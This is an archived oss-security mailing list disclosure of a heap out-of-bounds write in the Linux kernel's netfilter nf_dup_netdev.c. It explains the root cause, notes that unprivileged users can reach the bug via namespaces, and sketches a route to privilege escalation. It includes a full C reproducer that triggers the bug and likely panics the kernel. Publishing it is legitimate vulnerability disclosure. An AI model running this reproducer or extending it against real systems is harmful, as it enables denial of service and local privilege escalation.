X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7350" "Monday" "21" "February" "2022" "20:38:23" "+0000" "Nick Gregory" "Nick.Gregory@Sophos.com" nil "187" "[oss-security] Linux kernel: heap out of bounds write in nf_dup_netdev.c since 5.4" nil nil nil "2" nil nil (number mark "U       Nick.Gregory Feb 21  187/7350  " thread-indent "\"[oss-security] Linux kernel: heap out of bounds write in nf_dup_netdev.c since 5.4\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel: heap out of bounds write in nf_dup_netdev.c since 5.4" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17485 invoked by uid 550); 21 Feb 2022 20:41:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14071 invoked from network); 21 Feb 2022 20:38:45 -0000
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=WU0cx3QWmb9EfIeIG1g4HX/WyBMj5KHLgcNi64kauY+N8R3uzYJQ17vky3Wq/aGmBkAN0YwwFJLTFIHpRDOI+/rt7CQIo8LIJldfF8zL+lviAvNusB+Yto9NjgeRxqJRO7OhmKTHeTuFGjn7KirhbpuN716dcZMSpPMfP7Rf85Xoa7XudoJWF4TVvm2Jj0lIik3iBQ9ftdjTLHb5Kd1er1m/6gTW/KeBTJlRwn6qgXWIcjoZmcxTxhF6sekeeXyhTEcmWi3UB4mC20YZuKFSTklEBbhONwcdlCBSRETt3hlN0IbdSG2d35W3IRNW1c1g9rEg4+EmPKj7+rUvN+kLSA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=DNKN/34EcgwfYrDSyZkxhjBokHP2EwN5arMTh84uqao=;
 b=iLQmdZtU3Tl64/U8GV4DfggaheJhmUikZ6ED4wFbQF5ozw0SWaC+vamf/uxglE0llyhK9VVp2gK1Sye4wGDqStbN9G0HNk/YcfaenrdSmosp+AYDCW286VgQqeN75+MPFsCPmBXa2GVj9krVzB2dkU0DFTXkx5WIchwNqT3KeXlsjLtDo6k64aLCCfjTZphCu/rnrJ3WuyC9yvWxZ83uglQGPaxyFYLsAsK1fyHsxgOG9z/bFA7RiDH3Vm1F+CflLRZ/vA76K3ZMO7rukIxX39G3zHi9nT60d+3n/qTJkBaqPdn9MKw3Xbl0160ZF/wmXebmfikTCDcS1MYSR4kNow==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=sophos.com; dmarc=pass action=none header.from=sophos.com;
 dkim=pass header.d=sophos.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=sophosapps.onmicrosoft.com; s=selector1-sophosapps-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=DNKN/34EcgwfYrDSyZkxhjBokHP2EwN5arMTh84uqao=;
 b=tbF+fAq8TyLrgWNUnSoPQYTjhp1JW619P8/NCLZgz0h0oteXENcU36Kdhe03l/u8Tk0tmYAie9j0lZv0OAr185zwa9Ljjn59rxpKHpd9CTe2xR6NDwooqrYw9v/eIuVywllGB1QK4Y/po+fJzjSeDSikPCe0mSsqBdaT+XsKrKs=
From: Nick Gregory <Nick.Gregory@Sophos.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: Linux kernel: heap out of bounds write in nf_dup_netdev.c since
 5.4
Thread-Index: AQHYJ2L49O6/yyhpgEeu/ccAb5QlAw==
Date: Mon, 21 Feb 2022 20:38:23 +0000
Message-ID: <07A9630F-EFEE-4232-BD58-523C27D0D535@sophos.com>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
authentication-results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=Sophos.com;
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: 9f2bc218-56b5-451f-3530-08d9f57a1afd
x-ms-traffictypediagnostic: LOYP265MB2128:EE_
x-microsoft-antispam-prvs: <LOYP265MB21282FDFE241ADE3D6A1C265FF3A9@LOYP265MB2128.GBRP265.PROD.OUTLOOK.COM>
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: lw5n6M4ERUXYiCo691bzcEHbTcWvKUQlDbZsYaOMbPrOSKWuiqc5rTlG1blXStmrzhWgqL9C+InDw+iOmHx//rfRH/N0LYGewnVsdLtcNeCKop0lGEOvU8SU5LxL+4m8DQ/v2rJP5x2UR+zKl8zkHXwNpxuh0ueTeqvBvWpkOqekdy/lFWLSdYBgOx51OIHBc0cQGKcZ1zyoKpQiKB4bz1n7jmFAmIzZG4wfoupRtnkHoDWiI95eLSEmsbvZLvLlzMFfx6JHzRcDd/Z+cbgpMk+80ZcCDgdcH6oJ0aYJQjNhWfRcg//11EueyOopTpLGYGmRAKUpehmxdHJ3plkyHp7Svn963P9Gg/0lwyELO35/jUYrw2LQHr7OdrTuguGa8bAJYi466TXZsgcZyFYOJEhfZnMBbzrEDrEccCXOc4pcxtzftPjnKnsJT/upOtEhQw9xnHW4+oKPhJKRb3IISx+VCEtbF51gA6G4ru2r7ZrJUKS9+xuiewAiDfc4nBZ7cyvf+/3XV3njokiAZxIHPmnGx5MeVr2qNF1yzvlMT854aAczWKf8YWJNGXmyp+bMYtKAS/VoSFtM83Fk2JiwvjQ4XOzj33WTxR7jRr7f0swvtylvdA8MsNhm0jcvBCSilWEqCqFPDzeZtfbZ6ALf2v/lK6JKmtK6Qrl3Ow4uCdqMpFLAzrMQXKJ7my0F7ZKosOHCm7/VMfHjfoKQwG88kOdMY0fr/FsNQIobCieZ7Alhb77EdtXIDNnvRLz3GZqYFMu9mhGAO0cLqgo/isQLlXbGsg1isuSuYUljxHSAAKMfJtzStqqRH00MGbM3vQd+6+DLSEH1dJx30UWS/DkdWTDHl6JcQt272NkVusflrdI=
x-forefront-antispam-report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CWLP265MB4972.GBRP265.PROD.OUTLOOK.COM;PTR:;CAT:NONE;SFS:(13230001)(4636009)(366004)(316002)(71200400001)(2616005)(6916009)(5660300002)(86362001)(36756003)(26005)(83380400001)(186003)(76116006)(66946007)(966005)(8676002)(33656002)(66476007)(66446008)(122000001)(64756008)(91956017)(2906002)(66556008)(6506007)(508600001)(6512007)(6486002)(38070700005)(38100700002)(8936002)(45980500001);DIR:OUT;SFP:1101;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: =?us-ascii?Q?mBJoT8rnhFdCmsWkF0mys6J/4o/I0sOTVEADSWDUsO04JSr7Ig9opvmGeyEa?=
 =?us-ascii?Q?S6zsn14l9w7iZOd66E+kdiQ+2Mv1JY0umqeHG80BWl3sP2JSjyi6xdWlrXHa?=
 =?us-ascii?Q?osVr73m/mSrnOW/6DIrbJ/Uj0krjh96ojD0WspguiQVem0hyBRv6zB7p8nXi?=
 =?us-ascii?Q?4t1rs3g0i209HdBokA1CLQtkqzwR6qk00fVph1cB5Q+NdsSvx29qIrzg3DL0?=
 =?us-ascii?Q?Ba1GxydL3YKxNslcjmEcmyfwE5UAkBFCiisAo8Bs9Erad+2CgSg3iKMGY3I5?=
 =?us-ascii?Q?13cBXpYj0WSMwdbvGaVSfFHyUFioKPl8BTu6mQ6EcFfQS60QkTLozKXHcTN7?=
 =?us-ascii?Q?KAuNF1oz+x1/ZyDlEN4bm23BfhrbGq9st9pBDvIa86ilBKzCXHL+tCkl6/Cy?=
 =?us-ascii?Q?bVStVOKEe7PPtJPNVmYVXG67i1O3DU89wEiqGlMz/OQ5X4JBqVgv21WlUSQi?=
 =?us-ascii?Q?bZZdrvIHheVUm4esm3pyv6h6jOO5SWn5lPC6YUOyqDa5kV76iw3MUNL9Ht4L?=
 =?us-ascii?Q?oVdu+AmpQt78j/j4V1vK60gTxkNc7A781hAGYDhmd9FXIlbbfGcWRzSz+LDE?=
 =?us-ascii?Q?CU03/jVXsdINTRkQ7TC6DB72mKHVu6Dj484Xli3O/I9X2DYd0UGjoUFA7N7C?=
 =?us-ascii?Q?1RTYk4DzhK9bv3tFVmfoqxgvs48Y6LjXke02lVjQ/wwDtjj8QqF8dkwmLPaN?=
 =?us-ascii?Q?Abw0vaayceqKiNsk+6vD9R0p2lDOn+PWJ8TZ4e10vW6/uQhfB340a3ZhkS/t?=
 =?us-ascii?Q?n5tVJ4BxB3Lv2ok0/tLsnXZj60myZnc5z5u3s5ih2ioLXIILd/xADnBV68A7?=
 =?us-ascii?Q?j7tBZomFFkML4WnhFUmTqs/HLv6/7HYuZEQnIWajLiqR84LXPoeRIqihZ/S6?=
 =?us-ascii?Q?rX045lB+abMGajzCYlQ/SaR8201s3q9QIjUyXn44Gt85utPjHxdZl79p1bx/?=
 =?us-ascii?Q?dcMA6uxEAAjUb+skwj+15HUeKijjHNg/E9d0WY+vksRXDgLVLjGAk9fLKAq6?=
 =?us-ascii?Q?zPpK/ZfBGkvP6kWYdVWkm8rivb52gV/wNiK3DhLHMZWbkjS5Xk4dilTm54fy?=
 =?us-ascii?Q?IF+dOXB6jEhuOzfUBdYbf3+WgJI0aUVWVWP+Q4rZ7Am6IPEuNFdND3g2KMVv?=
 =?us-ascii?Q?3I5gyInBWOurBjNfYpFDm3IyoBZ4nQI3R7BAiKk8249ZqFRD+xmznEmP7X+b?=
 =?us-ascii?Q?DekJ+E0zrw/l5R3tv/9S36AZpQLuRY1wg3qyhG7zzNJKySMM1gMzWtqi3iBC?=
 =?us-ascii?Q?vaoXGxurhdV2XvbmycCKNAjVFILqnEgtWGVAgM1Sve5KM0RGz0myaYg1WttI?=
 =?us-ascii?Q?tw4OmdW4Fh+QAyFnw6qoBJ3Sz6pMmnXXzW2/nViXxu++VgoCrrxopV7qe5fq?=
 =?us-ascii?Q?40oOYdJ4Y9g5Ec7ou8MsO7Sf0vOulJzKGcKSbqGt/xSc0IKDynL5bTRgT5dh?=
 =?us-ascii?Q?McQyV3WEPLdxk4x/pk+l3Oix69mbcvEZ5HnoOs1ZaLtXeuPkGGEMGmYGQuE6?=
 =?us-ascii?Q?BN1ZdIaccuxIKlLscRt+xa5yKxu2gV+e3h5D0xT1+W74eDsqu+V+ubtdhnXP?=
 =?us-ascii?Q?s4TpXd5gql2v68C01HZ6rkEzIbSkzsThjgt7rgwOilceRAN733XrBowRwWHy?=
 =?us-ascii?Q?PBMVGHpdHOJ9vAnT0ycL+x0=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <AA3E469EB8C2284E817A71816CD32E00@GBRP265.PROD.OUTLOOK.COM>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: CWLP265MB4972.GBRP265.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-Network-Message-Id: 9f2bc218-56b5-451f-3530-08d9f57a1afd
X-MS-Exchange-CrossTenant-originalarrivaltime: 21 Feb 2022 20:38:23.6471
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 358a41ff-46d9-49d3-a297-370d894eae6a
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: AyYc24JyA2LHHSUkw2BD/QzgVfZcbToB8cxA2U0ZtGfFZnXvHmS4lAOGjYlAQDI6oS5OhG3PS5QBKKF20n3cFg==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: LOYP265MB2128
X-OriginatorOrg: sophos.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sophos.com; h=from:to:subject:date:message-id:content-type:content-id:content-transfer-encoding:mime-version; s=global; bh=DNKN/34EcgwfYrDSyZkxhjBokHP2EwN5arMTh84uqao=; b=Ly3RwVdWrZ9EyNF8Wq0LsF9dMM5Pz+CDtejPPjQUeR5bNU9AHFXl7TlXlRxjhzB7A2RGEp5FuIXyDnEEDSJbzFogIvcq1B7kAviobEUkj88jLkjXacK4/aR7K77EXZiZBDwv/nZODbXrtz0a61lujAcJtyB+ADanKuxlbn1pb68=
Subject: [oss-security] Linux kernel: heap out of bounds write in nf_dup_netdev.c since 5.4

There is a heap out of bounds write in the function nft_fwd_dup_netdev_offl=
oad (nf_dup_netdev.c). This was introduced in 5.4-rc1 by https://git.kernel=
.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3Dbe2861dc36d77=
ff3778979b9c3c79ada4affa131, and is fixed by https://git.kernel.org/pub/scm=
/linux/kernel/git/netfilter/nf.git/commit/?id=3Db1a5983f56e371046dcf164f90b=
faf704d2b89f6. I have created a sample LPE targeting Ubuntu 21.10 with KASL=
R disabled.

In nft_fwd_dup_netdev_offload, ctx->num_actions++ is used to offset into th=
e flow->rule->action.entries array (nf_dup_netdev.c:67) when setting up dup=
 or fwd flow rules on a chain with hardware offload enabled. However there =
is a mismatch between the number of times the increment is called vs. the n=
umber of allocated entries. The allocated array size is based on the number=
 of nftables expressions that have expr.offload_flags&NFT_OFFLOAD_F_ACTION =
(nf_tables_offload.c:97), but only the immediate expression type has this (=
not dup or fwd). It's possible to manually create a rule with dup/fwd expre=
ssions that don't have a corresponding/preceding immediate, leading to an u=
ndersized entries array, and an arbitrary number of out of bounds array wri=
tes. Despite being in code dealing with hardware offload, this is reachable=
 when targeting network devices that don't have offload functionality (e.g.=
 lo) as the bug is triggered before the rule creation fails. Additionally, =
while nftables requires CAP_NET_ADMIN, we can unshare into a new network na=
mespace to get this as a (normally) unprivileged user. The reproducer code =
below demonstrates all of this, and will likely immediately panic the syste=
m.

This can be turned into kernel ROP/local privilege escalation without too m=
uch difficulty, as one of the values that is written out of bounds is conve=
niently a pointer to a net_device structure. There are many opportunities f=
or one of the OOB writes to land in another heap allocated structure which =
then misuses it (type confusion, freeing it, etc.). Additionally, an OOB wr=
ite could be landed in a buffer returned to userland, leaking the address o=
f the net_device allocation out.

Reproducer (build with gcc repro.c -o repro -lmnl -lnftnl):

#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <err.h>


int main(int argc, char **argv) {
   if (geteuid() !=3D 0) {
       puts("re-execing with unshare");
       char *args[] =3D {
           "unshare",
           "-Urn",
           argv[0],
           NULL,
       };
       execvp("unshare", args);
       err(1, "unshare re-exec");
   }

   // setup table
   struct nftnl_table *table =3D nftnl_table_alloc();
   nftnl_table_set_str(table, NFTNL_TABLE_NAME, "x");
   nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

   // chain
   struct nftnl_chain *chain =3D nftnl_chain_alloc();
   nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, "x");
   nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, "y");
   nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_NETDEV_INGRESS);
   nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 10);
   nftnl_chain_set_str(chain, NFTNL_CHAIN_DEV, "lo");
   nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");
   //nftnl_chain_set_u32(chain, NFTNL_CHAIN_FLAGS, CHAIN_F_HW_OFFLOAD); // =
see below

   // and rule
   struct nftnl_rule *rule =3D nftnl_rule_alloc();
   nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, "x");
   nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, "y");

   struct nftnl_expr *exprs[128];
   int exprid =3D 0;

   exprs[exprid] =3D nftnl_expr_alloc("meta");
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_META_KEY, NFT_META_PROTOCOL=
);
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_META_DREG, NFT_REG_1);
   nftnl_rule_add_expr(rule, exprs[exprid]);
   exprid++;

   exprs[exprid] =3D nftnl_expr_alloc("cmp");
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_SREG, NFT_REG_1);
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
   nftnl_expr_set_u16(exprs[exprid], NFTNL_EXPR_CMP_DATA, 8);
   nftnl_rule_add_expr(rule, exprs[exprid]);
   exprid++;

   exprs[exprid] =3D nftnl_expr_alloc("payload");
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_BASE, NFT_PAYLOAD_N=
ETWORK_HEADER);
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_OFFSET, 16);
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_LEN, 4);
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_DREG, NFT_REG_1);
   nftnl_rule_add_expr(rule, exprs[exprid]);
   exprid++;

   exprs[exprid] =3D nftnl_expr_alloc("cmp");
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_SREG, NFT_REG_1);
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_DATA, 0x0200007f);
   nftnl_rule_add_expr(rule, exprs[exprid]);
   exprid++;

   // this is a "normal" dup, which is accounted for (as it has an immediat=
e)
   exprs[exprid] =3D nftnl_expr_alloc("immediate");
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_IMM_DREG, NFT_REG_1);
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_IMM_DATA, 1);
   nftnl_rule_add_expr(rule, exprs[exprid]);
   exprid++;
   exprs[exprid] =3D nftnl_expr_alloc("dup");
   nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_DUP_SREG_DEV, NFT_REG_1);
   nftnl_rule_add_expr(rule, exprs[exprid]);
   exprid++;

   // these dups are out of bounds.
   for (int unaccounted_dup =3D 0; unaccounted_dup < 100; unaccounted_dup++=
) {
       exprs[exprid] =3D nftnl_expr_alloc("dup");
       nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_DUP_SREG_DEV, NFT_REG_1=
);
       nftnl_rule_add_expr(rule, exprs[exprid]);
       exprid++;
   }


   // serialize

   char buf[MNL_SOCKET_BUFFER_SIZE];

   struct mnl_nlmsg_batch *batch =3D mnl_nlmsg_batch_start(buf, sizeof(buf)=
);
   int seq =3D 0;

   nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
   mnl_nlmsg_batch_next(batch);

   struct nlmsghdr *nlh;
   nlh =3D nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
       NFT_MSG_NEWTABLE, NFPROTO_NETDEV,
       0, seq++);
   nftnl_table_nlmsg_build_payload(nlh, table);
   mnl_nlmsg_batch_next(batch);

   nlh =3D nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
       NFT_MSG_NEWCHAIN, NFPROTO_NETDEV,
       NLM_F_CREATE, seq++);
   nftnl_chain_nlmsg_build_payload(nlh, chain);
   // libnftnl version i'm using doesn't have the CHAIN_F_HW_OFFLOAD stuff =
so manually add here
   mnl_attr_put_u32(nlh, NFTA_CHAIN_FLAGS, htonl(2));
   mnl_nlmsg_batch_next(batch);

   nlh =3D nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
       NFT_MSG_NEWRULE, NFPROTO_NETDEV,
       NLM_F_CREATE|NLM_F_APPEND, seq++);
   nftnl_rule_nlmsg_build_payload(nlh, rule);
   mnl_nlmsg_batch_next(batch);

   nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
   mnl_nlmsg_batch_next(batch);

   struct mnl_socket *nl =3D mnl_socket_open(NETLINK_NETFILTER);
   if (nl =3D=3D NULL) {
       err(1, "mnl_socket_open");
   }

   if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
			      mnl_nlmsg_batch_size(batch)) < 0) {
       err(1, "mnl_socket_send");
   }

   return 0;
}=
